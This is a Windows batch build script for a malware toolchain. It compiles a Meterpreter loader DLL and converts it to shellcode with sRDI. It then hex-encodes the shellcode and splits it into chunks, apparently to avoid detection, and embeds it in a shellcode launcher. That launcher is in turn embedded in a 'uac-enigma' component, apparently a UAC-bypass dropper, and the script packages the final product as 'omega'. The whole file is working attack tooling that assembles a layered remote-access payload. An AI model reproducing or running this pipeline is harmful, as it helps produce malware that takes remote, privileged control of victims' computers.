@ echo off

set APP_HOME=%CD%
set sRDI=%APP_HOME%\sRDI\Python\ConvertToShellcode.py
set SHELLCODE_RES_DIR=%APP_HOME%\shellcode-launcher\src\resources
set UAC_RES_DIR=%APP_HOME%\uac-enigma\src\resources

pushd meterpreter-loader
call make.bat
popd
if %errorlevel% neq 0 goto EXIT

pushd meterpreter-loader\cmake-build-default\bin
python %sRDI% -f main libmain.dll && ^
xxd -p libmain.bin | ^
tr -d "\r\n" > payload.txt && ^
split -n 50 -e -d --additional-suffix=.txt payload.txt payload- && ^
mv -f payload-* %SHELLCODE_RES_DIR%
popd
if %errorlevel% neq 0 goto EXIT

pushd shellcode-launcher
call make.bat
popd
if %errorlevel% neq 0 goto EXIT

pushd shellcode-launcher\cmake-build-default\bin
python %sRDI% -f main libmain.dll && ^
xxd -p libmain.bin | ^
tr -d "\r\n" > payload.txt && ^
split -n 50 -e -d --additional-suffix=.txt payload.txt payload- && ^
mv -f payload-* %UAC_RES_DIR%
popd
if %errorlevel% neq 0 goto EXIT

pushd uac-enigma
call make.bat -DCPACK_OUTPUT_FILE_PREFIX=%APP_HOME:\=/%/cmake-build-default -DCPACK_PACKAGE_FILE_NAME=omega
popd
if %errorlevel% neq 0 goto EXIT

:EXIT
